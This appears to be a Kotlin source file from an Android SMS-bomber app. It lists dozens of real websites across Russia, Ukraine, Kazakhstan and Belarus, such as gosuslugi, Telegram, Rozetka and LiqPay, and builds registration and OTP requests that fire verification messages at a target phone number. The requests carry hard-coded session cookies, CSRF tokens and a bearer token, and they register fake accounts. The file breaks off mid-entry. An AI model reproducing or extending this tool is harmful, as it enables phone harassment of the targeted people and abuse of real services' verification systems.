@file:Suppress("SpellCheckingInspection")

package com.dm.bomber.services.repository

import android.annotation.SuppressLint
import com.dm.bomber.services.core.*
import com.dm.bomber.services.core.Callback
import com.dm.bomber.services.core.Phone.Companion.format
import com.dm.bomber.services.curl.CurlService
import com.dm.bomber.services.dsl.RequestBuilder
import com.dm.bomber.services.dsl.service
import kotlinx.serialization.json.jsonObject
import kotlinx.serialization.json.jsonPrimitive
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONException
import org.json.JSONObject
import java.io.IOException
import java.math.BigInteger
import java.nio.charset.StandardCharsets
import java.security.MessageDigest
import java.text.SimpleDateFormat
import java.util.*

/**
 * @noinspection ALL
 */
val services = listOf(
    object : JsonService("https://www.gosuslugi.ru/auth-provider/mobile/register", 7) {
        override fun buildJson(phone: Phone): String {
            val json = JSONObject()
            json.put("instanceId", "123")
            json.put("firstName", russianName)
            json.put("lastName", russianName)
            json.put("contactType", "mobile")
            json.put("contactValue", format(phone.phone, "+7(***)*******"))

            return json.toString()
        }
    },

    object : ParamsService("https://my.telegram.org/auth/send_password") {
        override fun buildParams(phone: Phone) {
            builder.addQueryParameter("phone", "+$phone")
        }
    },

    object : FormService("https://account.my.games/signup_phone_init/", 7) {
        override fun buildBody(phone: Phone) {
            request.header(
                "Cookie",
                "csrftoken=B6GwyuwOSpMCrx80eXfOWAAKsqHR3qjBv7UYwkpYprKv7LOJCmfYwvwWVmIHmeRQ; _ym_uid=1681051115670765382; _ym_d=1681051115; _ym_isad=2; amc_lang=ru_RU"
            )

            builder
                .add("csrfmiddlewaretoken", "B6GwyuwOSpMCrx80eXfOWAAKsqHR3qjBv7UYwkpYprKv7LOJCmfYwvwWVmIHmeRQ")
                .add("continue", "https://account.my.games/profile/userinfo/")
                .add("lang", "ru_RU")
                .add("adId", "0")
                .add("phone", phone.toString())
                .add("password", email)
                .add("method", "phone")
        }
    },

    object : ParamsService("https://findclone.ru/register") {
        override fun buildParams(phone: Phone) {
            builder.addQueryParameter("phone", phone.toString())
        }
    },

    object : Service(380) {
        override fun run(
            client: OkHttpClient,
            callback: Callback,
            phone: Phone
        ) {
            val json = JSONObject()
            json.put("msisdn", phone.toString())

            client.newCall(
                Request.Builder()
                    .url("https://mnp.lifecell.ua/mnp/get-token/")
                    .post(json.toString().toRequestBody("application/json".toMediaType()))
                    .build()
            ).enqueue(object : okhttp3.Callback {
                override fun onFailure(call: Call, e: IOException) {
                    callback.onFailure(call, e)
                }

                override fun onResponse(call: Call, response: Response) {
                    try {
                        val req = JSONObject(response.body!!.string())

                        val newJson = JSONObject()
                        newJson.put("contact", phone.toString())
                        newJson.put("otp_type", "standart")

                        client.newCall(
                            Request.Builder()
                                .url("https://mnp.lifecell.ua/mnp/otp/send/")
                                .header("authorization", "Token " + req.getString("token"))
                                .post(newJson.toString().toRequestBody("application/json".toMediaType()))
                                .build()
                        ).enqueue(callback)
                    } catch (e: NullPointerException) {
                        callback.onError(call, e)
                    } catch (e: JSONException) {
                        callback.onError(call, e)
                    }
                }
            })
        }
    },

    object : FormService("https://uss.rozetka.com.ua/session/auth/signup-phone", 380) {
        override fun buildBody(phone: Phone) {
            val name = russianName
            builder.add("title", name)
            builder.add("first_name", name)
            builder.add("last_name", russianName)
            builder.add("password", userName + "A123")
            builder.add("email", email)
            builder.add("phone", phone.phone)
            builder.add("request_token", "rB4eDGHMb00wHeQls7l4Ag==")
            request.addHeader(
                "Cookie",
                "ab-cart-se=new; xab_segment=123; slang=ru; uid=rB4eDGHMb00wHeQls7l4Ag==; visitor_city=1; _uss-csrf=zfILVt2Lk9ea1KoFpg6LVnxCivNV1mff+ZDbpC0kSK9c/K/5; ussat_exp=1640830991; ussat=8201437cececef15030d16966efa914d.ua-a559ca63edf16a11f148038356f6ac94.1640830991; ussrt=6527028eb43574da97a51f66ef50c5d0.ua-a559ca63edf16a11f148038356f6ac94.1643379791; ussapp=u3-u_ZIf2pBPN8Y6oGYIQZLBN4LUkQgplA_Dy2IX; uss_evoid_cascade=no"
            )
            request.addHeader("Csrf-Token", "zfILVt2Lk9ea1KoFpg6LVnxCivNV1mff+ZDbpC0kSK9c/K/5")
        }
    },

    object : ParamsService("https://www.sportmaster.ua/?module=users&action=SendSMSReg", 380) {
        override fun buildParams(phone: Phone) {
            builder.addQueryParameter("phone", phone.toString())
        }
    },

    object : FormService("https://yaro.ua/assets/components/office/action.php", 380) {
        override fun buildBody(phone: Phone) {
            builder.add("action", "authcustom/formRegister")
            builder.add("mobilephone", phone.toString())
            builder.add("pageId", "116")
            builder.add("csrf", "b1618ecce3d6e49833f9d9c8c93f9c53")
        }
    },

    object : JsonService("https://api.01.hungrygator.ru/web/auth/webotp", 7) {
        override fun buildJson(phone: Phone): String {
            val json = JSONObject()
            json.put("userLogin", format(phone.phone, "+7 (***) ***-**-**"))
            json.put("fu", "bar")
            return json.toString()
        }
    },

    object :
        FormService("https://sushiicons.com.ua/kiev/index.php?route=common/cart/ajaxgetcoderegister", 380) {
        override fun buildBody(phone: Phone) {
            builder.add("firstname", russianName)
            builder.add("phone", format(phone.phone, "+380 (**) ***-**-**"))
            builder.add("birthday", "2005-03-05")
        }
    },

    object : ParamsService("https://c.ua/index.php?route=account/loginapples/sendSMS", 380) {
        override fun buildParams(phone: Phone) {
            builder.addQueryParameter("route", "account/loginapples/sendSMS")
            builder.addQueryParameter("phone", "0$phone")
        }
    },

    object : FormService("https://be.budusushi.ua/login", 380) {
        override fun buildBody(phone: Phone) {
            builder.add("LoginForm[username]", "0$phone")
        }
    },

    object : JsonService("https://sberuslugi.ru/api/v1/user/secret", 7) {
        override fun buildJson(phone: Phone): String {
            val json = JSONObject()
            json.put("phone", format(phone.phone, "+7 (***) ***-**-**"))
            return json.toString()
        }
    },

    object : JsonService("https://api.sunlight.net/v3/customers/authorization/") {
        override fun buildJson(phone: Phone): String {
            request.header(
                "Cookie",
                "rr-testCookie=testvalue; rrpvid=355622261348501; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; city_auto_popup_shown=1; rcuid=6275fcd65368be000135cd22; city_id=117; city_name=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; city_full_name=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; region_id=91eae2f5-b1d7-442f-bc86-c6c11c581fad; region_name=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; region_subdomain=\"\"; ccart=off; _ga_HJNSJ6NG5J=GS1.1.1659884102.1.1.1659884103.59; _gcl_au=1.1.506379343.1659884104; session_id=6e72af95-3f3f-4b9f-a6d6-a7d278592347; _ga=GA1.2.1345812504.1659884102; _gid=GA1.2.362170990.1659884104; _gat_test=1; _gat_UA-11277336-11=1; _gat_UA-11277336-12=1; _gat_owox=1; tmr_lvid=220061aaaf4f8e8ab3c3985fb53cb3f3; tmr_lvidTS=1659884104985; tmr_reqNum=2; _tt_enable_cookie=1; _ttp=07d211e3-9558-4957-95dd-496cafdd2431; _ym_uid=1659884110990105023; _ym_d=1659884110; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D; _ym_isad=2; _ym_visorc=b"
            )

            return JSONObject()
                .put("phone", phone.toString())
                .toString()
        }
    },

    object : ParamsService("https://bankiros.ru/send-code/verify") {
        override fun buildParams(phone: Phone) {
            request.header(
                "Cookie",
                "_csrf=8582d9183ea0f6a17304125414be4795f198a69237317e3adf77463c93c2dc42a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%220bBJbi4bJgsHJ3_s2QkIYgUF5AGdKw8H%22%3B%7D; app_history=%5B%22https%3A%2F%2Fbankiros.ru%2F%22%5D; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2022-08-07%2017%3A47%3A30%7C%7C%7Cep%3Dhttps%3A%2F%2Fbankiros.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2022-08-07%2017%3A47%3A30%7C%7C%7Cep%3Dhttps%3A%2F%2Fbankiros.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F103.0.5060.134%20Safari%2F537.36%20Edg%2F103.0.1264.77; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fbankiros.ru%2F; city-tooltip=1; prod=5posuk9of5hcopttjj6bnfe8g2; _gcl_au=1.1.1996142512.1659883651; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; ga_session_id=4ce074bd-0b40-4664-8231-10c73438fc06; _gid=GA1.2.151715844.1659883653; _ga_5D863YT644=GS1.1.1659883653.1.0.1659883653.0; tmr_lvid=7e50cf8f2108a9fb1e34da6702768225; tmr_lvidTS=1659883653264; tmr_detect=0%7C1659883655576; _ga=GA1.2.316605841.1659883653; _ym_uid=1659883656667247307; _ym_d=1659883656; _ym_visorc=b; _ym_isad=2; tmr_reqNum=3; cookies-tooltip=223025677b0f227a6dd1c3820a99553a6d485d2246bf8dbc1879a5982ec9a863a%3A2%3A%7Bi%3A0%3Bs%3A15%3A%22cookies-tooltip%22%3Bi%3A1%3Bs%3A1%3A%221%22%3B%7D"
            )
            request.header(
                "x-csrf-token",
                "LcaB1fFLqRU-B791Zfir3HeB2tSxeA2vSWNTxHXxy9QdpMOfkyKdd3RgzD0vy_SvRdCxnegfWOl8IhSgPobznA=="
            )
            request.header("x-requested-with", "XMLHttpRequest")
            builder.addQueryParameter("action", "sendSms")
            builder.addQueryParameter("phone", phone.toString())
            builder.addQueryParameter("userIdentityId", "91445499")
            builder.addQueryParameter("ga", "GA1.2.316605841.1659883653")
        }
    },

    object : Service(7) {
        override fun run(
            client: OkHttpClient,
            callback: Callback,
            phone: Phone
        ) {
            client.newCall(
                Request.Builder()
                    .url("https://ovenpizza.ru/wp-content/themes/twentynineteen/inc/func.php")
                    .post(
                        """
    ------WebKitFormBoundaryZqudgny7DXMMKMxU
    Content-Disposition: form-data; name="flag"
    
    check_login
    ------WebKitFormBoundaryZqudgny7DXMMKMxU
    Content-Disposition: form-data; name="tel"
    
    ${format(phone.phone, "+7 *** *** **-**")}
    ------WebKitFormBoundaryZqudgny7DXMMKMxU--
    """.trimIndent().toRequestBody("multipart/form-data; boundary=----WebKitFormBoundaryZqudgny7DXMMKMxU".toMediaType())
                    )
                    .build()
            ).enqueue(callback)
        }
    },

    object : FormService("https://chocofood.kz/gateway/user/v2/code/", 77) {
        override fun buildBody(phone: Phone) {
            builder.add("client_id", "11619734")
            builder.add("login", phone.toString())
        }
    },

    object : JsonService("https://sso.mycar.kz/auth/login/", 77) {
        override fun buildJson(phone: Phone): String {
            return JSONObject()
                .put("phone_number", "+$phone")
                .toString()
        }
    },

    object : ParamsService("https://arbuz.kz/api/v1/user/verification/phone", 77) {
        override fun buildParams(phone: Phone) {
            request.header(
                "authorization",
                "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI1MjZjODk1NS0wMzgzLTRiM2QtYTJjNy0wZDQ2N2NlYzVhZWQiLCJpc3MiOiJRaEZTNW5vMmJqQzQ3djVRNEU3N0FBMnh3V1BFdUJ1biIsImlhdCI6MTY1OTg5MTQ3MCwiZXhwIjo0ODEzNDkxNDcwLCJjb25zdW1lciI6eyJpZCI6ImU1YzRlYTA1LWY4ZTgtNDJiZC1iMDJhLWNmMzNlODAyZjA5NiIsIm5hbWUiOiJhcmJ1ei1rei53ZWIuZGVza3RvcCJ9LCJjaWQiOm51bGx9.ebpJLdB-FOfb1IsAVbW-dECSoKwQc5tsnhhYKZ_FeM4"
            )
            builder.addQueryParameter("phone", phone.toString())
        }
    },

    object : FormService("https://www.liqpay.ua/apiweb/login/start", 380) {
        override fun buildBody(phone: Phone) {
            request.header(
                "Cookie",
                "_gcl_au=1.1.2000038126.1661250974; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2022-08-23%2013%3A36%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.liqpay.ua%2Fauthorization%3Freturn_to%3D%252Fuk%252Fadminbusiness%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2022-08-23%2013%3A36%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.liqpay.ua%2Fauthorization%3Freturn_to%3D%252Fuk%252Fadminbusiness%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F104.0.5112.102%20Safari%2F537.36%20Edg%2F104.0.1293.63; _ga_SC8SJ5GD85=GS1.1.1661250974.1.0.1661250974.0.0.0; _fbp=fb.1.1661250974723.798111670; _ga=GA1.2.804869749.1661250975; _gid=GA1.2.1515868995.1661250975; _dc_gtm_UA-213775397-1=1; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.liqpay.ua%2Fuk%2Flogin%2Flogin%2F1661250975005613_69027_PhMFILQwTvgiZrnm8B7X; _dc_gtm_UA-48226031-1=1"
            )
            request.header("-requested-with", "XMLHttpRequest")
            builder.add("token", "1661250975005613_69027_PhMFILQwTvgiZrnm8B7X")
            builder.add("phone", phone.toString())
            builder.add("pagetoken", "1661250975005613_69027_PhMFILQwTvgiZrnm8B7X")
            builder.add("checkouttoken", "1661250975005613_69027_PhMFILQwTvgiZrnm8B7X")
            builder.add("language", "uk")
        }
    },

    object : JsonService("https://green-dostavka.by/api/v1/auth/request-confirm-code/", 375) {
        override fun buildJson(phone: Phone): String {
            request.header(
                "Cookie",
                "tmr_lvid=0967463045c6bc62af3d493d4e61a7f6; tmr_lvidTS=1664384202297; _ga=GA1.2.618762003.1664384202; _gid=GA1.2.2070330642.1664384203; _dc_gtm_UA-175994570-1=1; _gat_UA-231562053-1=1; _ym_uid=1664384203181017640; _ym_d=1664384203; _ym_isad=2; _ym_visorc=w; _ga_0KMPZ479SN=GS1.1.1664384202.1.1.1664384204.58.0.0; tmr_detect=0|1664384205010; tmr_reqNum=6"
            )

            return JSONObject()
                .put("phoneNumber", format(phone.phone, "+375 ** *** ** **"))
                .toString()
        }
    },

    object : JsonService("https://sosedi.by/local/api/smsSend.php", 375) {
        override fun buildJson(phone: Phone): String {
            request.header(
                "Cookie",
                "_gcl_au=1.1.440078486.1664384002; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session={\"deviceGuid\":\"bb0643e8-bc08-4838-bf34-5b23a4221287\"}; _ym_uid=1664384005288308463; _ym_d=1664384005; _ga=GA1.2.1716162404.1664384005; _gid=GA1.2.256273649.1664384005; tmr_lvid=6015526cad4b89db479519786a667a37; tmr_lvidTS=1664384004982; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; PHPSESSID=zlqD9vpWcOSVOhtY5iv9rjySBYog0QQk; _gat_gtag_UA_34496864_1=1; _ym_visorc=w; _ym_isad=2; tmr_detect=0|1664468829484; tmr_reqNum=12; cookiepolicyaccept=true"
            )

            return JSONObject()
                .put("phone", format(phone.phone, "+375 (**) *******"))
                .toString()
        }
    },

    object : FormService("https://www.respect-shoes.kz/send_sms", 77) {
        override fun buildBody(phone: Phone) {
            builder.add("_token", "K0uMK3EpgqiMLt1pXeqsPoQxtnPZBWen98Sm41bH")
            builder.add("tel", format(phone.phone, "+7 (7**) ***-**-**"))
            request.header(
                "cookie",
                "_gcl_au=1.1.1523339745.1664471567; tmr_lvid=5cfff78042fa8318f8edede4e2f1780d; tmr_lvidTS=1659695387764; _gid=GA1.2.759847769.1664471567; _ym_uid=1659695389109290314; _ym_d=1664471567; roistat_visit=1941526; roistat_is_need_listen_requests=0; roistat_is_save_data_in_cookie=1; _ym_visorc=w; _ym_isad=2; _tt_enable_cookie=1; _ttp=3fc27b9b-4797-4657-8bc9-b00a346625d6; ___dc=61a72ed9-acc4-44f9-ac7d-1fd9e1ea2ae8; Cookie_id=eyJpdiI6Imdpc216aGlUT1cwS1BaVVwvSXQ1OGZnPT0iLCJ2YWx1ZSI6IlpFMlJKWEFzOVwvbEVWejRYTm11d1JXZ2VQVTZZNk5kUjhSXC83R2tEMkpHMU52bDdXY1cxdVZrZ3JuWitMa0M5ciIsIm1hYyI6IjAzMTAwOTE1M2JiODZiZmU5YzJkZTkyNTVhOGRkODcxMzI1MDlhNDYyOGU3YzQ0YTIyNGUzOTBmMmViOTkyODgifQ==; siti_id=eyJpdiI6IlY1Vk1vTFBpUlwvRkp0c252QkFVMklnPT0iLCJ2YWx1ZSI6IkdkSnl0elk2NGF5SmNWWjhPdWxyZHc9PSIsIm1hYyI6Ijg2Y2E2NDhkZThlMDMzZDRmNzBhNDk2Mzg5YTk3OTkyNTZiNmNmOTAwZTc3MjZlZGIwODgwNjgwN2QwNmRiMjQifQ==; sitiset=eyJpdiI6InlWaUxXQjcxcGpPWUQrV3dBeXpWXC9nPT0iLCJ2YWx1ZSI6IkZiVXZmM2NGR0N0TUVMT2hyRWdZT2c9PSIsIm1hYyI6IjMyODM2YmRiMThlYzRmZDhhNjdkZGYxOTE2M2I3ZTIwNmQ2ZWZhOWQxOTQ1ZGZiMWRlODAzZDU3NjA2ZjAwYzcifQ==; roistat_call_tracking=1; roistat_emailtracking_email=null; roistat_emailtracking_tracking_email=null; roistat_emailtracking_emails=null; roistat_cookies_to_resave=roistat_ab,roistat_ab_submit,roistat_visit,roistat_call_tracking,roistat_emailtracking_email,roistat_emailtracking_tracking_email,roistat_emailtracking_emails; _ga=GA1.2.111816835.1664471567; tmr_detect=0|1664471755330; tmr_reqNum=14; 499818=eyJpdiI6InNxWkp6M05Tajl4SlZXb2t5R1wvNFVnPT0iLCJ2YWx1ZSI6Im0xb3poMUJHclpSZFA3TnhqWXp3RVlrRFwvSUNBaVNRdXRPRmtjWGJ0M3Y2RzUrM052OG9YWE9yMnFMVExyK2cwWUNzOHFtb1wvd0E3c0JFemNmc0J1Rmc9PSIsIm1hYyI6IjRkMTdkZDVjZjY1ZmFjNWE0OWJjNGNiOGEwMGNiM2UyMzY1ZDQ2ZjIxM2Y4NTQ1NmVkYmMwNDQ2NTQ4ZmM3MjIifQ==; _ga_NFEYSRQ86N=GS1.1.1664471566.1.1.1664471942.0.0.0; XSRF-TOKEN=eyJpdiI6Ikt3MjZrY0NPQkpSZlNkY0J1ckpuSGc9PSIsInZhbHVlIjoia1BGNTFITnB3Z3ZlaFYrMzhoZWlIVmp6dHFcL0JvSjZST280bnJpRm9XejdBa2d6cjByODN3RTdoZE9NdG84blciLCJtYWMiOiIwMmE0OTkxNGRjMzc4OWYxZWIzMmNlNzRkYWMzZDVhNjI4ZDQ1NmVmMmRjN2Y5MTU1NzRiNGFkMzliODBmNDlmIn0=; laravel_session=eyJpdiI6IlwvRGpJdkVIY3RHdTlhRDRINWt6czRnPT0iLCJ2YWx1ZSI6ImFhaFVOWXpXdGRVVE1vWjRQXC9PNEQwaWEwaXFQaGNCZUhyemVncWp5YlI4VERxeFwvY3RicDFMWW9vNDVWcmFrZiIsIm1hYyI6IjA1MmNlNzM1NzNhNzc2OTg2MGFiMDQzZTY2ZmMxOGIyOTlhNzFiNTkwNjU3NDYyYzQ3MTYyMjkyODdlMTM2NzkifQ==; 768131=eyJpdiI6IkQ0cGlZcVUzNXNxUXNPaTNjNEcwRnc9PSIsInZhbHVlIjoiUk5URkR1Y05Vclc1Y01qbE5aUzJCZkdtMmp1Qll5WlNNeXNpeDV2MzVDYmtUcUZrT1wvcUVlaU1ianQraU41RTU1NWVEZVNGMkNCaVZuREN6U2ppV29BPT0iLCJtYWMiOiJkOThjNGE5ZTQwNGQxNjAwMWI0YmI2NmRiZjk1OTExNTNhOWI4YzcwNGE0N2IzNDcyNDRmNzBhMmIyNmFmYTM5In0=; tel=eyJpdiI6IlhLa2ExTVJsc3plZ1c4cEFiRGFIM1E9PSIsInZhbHVlIjoiZDB2MFpiMERqZTMxTzdBUkRVb0dSUT09IiwibWFjIjoiMjliZDdiZWQxYzNiYzkwZTM2MjJjNGNiY2ZmODY5MzQxYzE0MWEzODgzYWYyNTM5Mzg5YjYxNzJkMmQ4MzU1YSJ9"
            )
            request.header("X-Requested-With", "XMLHttpRequest")
        }
    },

    object : FormService("https://id.kolesa.kz/getInfoAuth.json", 77) {
        override fun buildBody(phone: Phone) {
            builder.add("project", "market")
            builder.add("login", "+$phone")
            builder.add("csrf", "czhDbUhLR1E5YUh1dHllZ0ZOdlU0UT09")
            builder.add("restore", "0")
            builder.add("iteration", "primary")
            request.header(
                "cookie",
                "ccid=vur2iajjpti6u660kdkii4mlgd; ssaid=e020e420-401b-11ed-b971-fb3d2d634bd2; __tld__=null"
            )
            request.header("X-Requested-With", "XMLHttpRequest")
        }
    },

    object : Service(7) {
        override fun run(
            client: OkHttpClient,
            callback: Callback,
            phone: Phone
        ) {
            val formattedPhone = format(phone.phone, "+7 (***) ***-**-**")
            client.newCall(
                Request.Builder()
                    .url("https://babylonvape.ru/auth/registration/?register=yes&backurl=%2Fauth%2F")
                    .header("upgrade-insecure-requests", "1")
                    .header("referer", "https://babylonvape.ru/auth/registration/?register=yes&backurl=/auth/")
                    .header(
                        "cookie",
                        "PHPSESSID=9D26aEZS5EpjZlhsd1Y1NYWyAufAzpwp; BITRIX_SM_SALE_UID=c29417494cd049f7c5fcf28051ace9d2; rrpvid=780283164294524; BITRIX_CONVERSION_CONTEXT_s1={\"ID\":5,\"EXPIRE\":1664657940,\"UNIQUE\":[\"conversion_visit_day\"]}; _ym_debug=null; _ym_uid=1654436025122788696; _ym_d=1664632221; rcuid=6275fcd65368be000135cd22; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _ym_isad=2; _ym_visorc=w; _ga=GA1.2.877344353.1664632222; _gid=GA1.2.958698788.1664632222; rrwpswu=true; babylon_confirm_age=Y; _gat_gtag_UA_56968396_1=1"
                    )
                    .post(
                        """
    ------WebKitFormBoundaryZKfaTYUmRp781EJr
    Content-Disposition: form-data; name="backurl"
    
    /auth/
    ------WebKitFormBoundaryZKfaTYUmRp781EJr
    Content-Disposition: form-data; name="register_submit_button"
    
    reg
    ------WebKitFormBoundaryZKfaTYUmRp781EJr
    Content-Disposition: form-data; name="REGISTER[LOGIN]"
    
    1
    ------WebKitFormBoundaryZKfaTYUmRp781EJr
    Content-Disposition: form-data; name="REGISTER[LAST_NAME]"
    
    
    ------WebKitFormBoundaryZKfaTYUmRp781EJr
    Content-Disposition: form-data; name="REGISTER[NAME]"
    
    
    ------WebKitFormBoundaryZKfaTYUmRp781EJr
    Content-Disposition: form-data; name="REGISTER[SECOND_NAME]"
    
    
    ------WebKitFormBoundaryZKfaTYUmRp781EJr
    Content-Disposition: form-data; name="REGISTER[EMAIL]"
    
    $email
    ------WebKitFormBoundaryZKfaTYUmRp781EJr
    Content-Disposition: form-data; name="REGISTER[PERSONAL_PHONE]"
    
    $formattedPhone
    ------WebKitFormBoundaryZKfaTYUmRp781EJr
    Content-Disposition: form-data; name="REGISTER[PASSWORD]"
    
    qwerty
    ------WebKitFormBoundaryZKfaTYUmRp781EJr
    Content-Disposition: form-data; name="REGISTER[CONFIRM_PASSWORD]"
    
    qwerty
    ------WebKitFormBoundaryZKfaTYUmRp781EJr
    Content-Disposition: form-data; name="licenses_register"
    
    Y
    ------WebKitFormBoundaryZKfaTYUmRp781EJr
    Content-Disposition: form-data; name="REGISTER[PHONE_NUMBER]"
    
    $formattedPhone
    ------WebKitFormBoundaryZKfaTYUmRp781EJr
    Content-Disposition: form-data; name="REGISTER[PHONE_NUMBER]"
    
    $formattedPhone
    ------WebKitFormBoundaryZKfaTYUmRp781EJr
    Content-Disposition: form-data; name="register_submit_button1"
    
    Регистрация
    ------WebKitFormBoundaryZKfaTYUmRp781EJr--
    """.trimIndent().toRequestBody(
                            "multipart/form-data; boundary=----WebKitFormBoundaryZKfaTYUmRp781EJr".toMediaType()
                        )
                    )
                    .build()
            ).enqueue(callback)
        }
    },

    object : FormService("https://www.moyo.ua/identity/registration", 380) {
        override fun buildBody(phone: Phone) {
            request.header("x-requested-with", "XMLHttpRequest")
            request.header(
                "cookie",
                "YII_CSRF_TOKEN=b5600a221539c29fd3628b4d0e682b65e8e51355; _hjSessionUser_1850514=eyJpZCI6ImY3MWQ2M2NhLTFmNjUtNTY5MC1hMDE4LTZjMzc1ZTM3NDk3MCIsImNyZWF0ZWQiOjE2NjUxNTMwMDY2NTEsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample=0; _hjSession_1850514=eyJpZCI6IjgwZmI0YzgwLWI0YWUtNDgxNC04NGE2LTk0YmVkODQ0NjM0ZiIsImNyZWF0ZWQiOjE2NjUxNTMwMDg2MzYsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1; new_user_ga=1; no_detected_user_ga=0; PHPSESSID=fdeiilohmvd7o6t1lm1ghhmm66; g_state={\"i_p\":1665160212060,\"i_l\":1}"
            )
            builder.add("firstname", russianName)
            builder.add("phone", format(phone.phone, "+380(**)***-**-**"))
            builder.add("email", email)
        }
    },

    object : FormService("https://sohorooms.ua/index.php?route=account/register/sms", 380) {
        override fun buildBody(phone: Phone) {
            request.header(
                "Cookie",
                "PHPSESSID=6d0d51e8f0da1fe803f36f1c2f53dd01; language=ru; currency=UAH; screen=1536x864; nav=5.0 (Windows NT 10.0; tzo=-180; cd=24; language=ru; referer=sohorooms.ua; referer_marker=1; _gcl_au=1.1.1518637680.1665305924; _gid=GA1.2.1889716149.1665305924; _gat=1; _fbp=fb.1.1665305924935.1029977243; _ga_KFE70ENL3B=GS1.1.1665305924.1.1.1665305926.58.0.0; _ga=GA1.2.1706081357.1665305924; _hjSessionUser_2799148=eyJpZCI6ImQxNmFmZmYyLTJhOWMtNTMxMC1hMTZjLTU2Y2EyMTEwMWJkMiIsImNyZWF0ZWQiOjE2NjUzMDU5MjY3NDMsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample=0; _hjSession_2799148=eyJpZCI6IjNkMGVmYmViLTlmYjctNDE0Yy04NTY4LTU1YzUxOGU4MDYzOSIsImNyZWF0ZWQiOjE2NjUzMDU5MjY3NjksImluU2FtcGxlIjpmYWxzZX0=; _hjIncludedInPageviewSample=1; _hjAbsoluteSessionInProgress=0; googtrans=/ru/uk; googtrans=/ru/uk"
            )
            builder.add("telephone", format(phone.phone, "+38 (***) ***-**-**"))
        }
    },

    object : Service(7) {
        override fun run(
            client: OkHttpClient,
            callback: Callback,
            phone: Phone
        ) {
            val password = email
            client.newCall(
                Request.Builder()
                    .url("https://www.podrygka.ru/ajax/phone_confirm_code_validate.php")
                    .header(
                        "Cookie",
